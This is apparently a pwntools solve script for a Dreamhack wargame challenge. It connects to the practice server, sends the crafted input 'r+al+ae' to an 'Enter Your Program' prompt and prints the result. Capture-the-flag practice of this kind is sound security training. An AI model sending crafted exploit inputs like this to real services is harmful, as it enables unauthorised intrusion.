from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 18543)

payload = b"r+al+ae"
p.sendlineafter(b"Enter Your Program", payload)


p.recvuntil(b"Result: ")
res = p.recvline()
print(res)
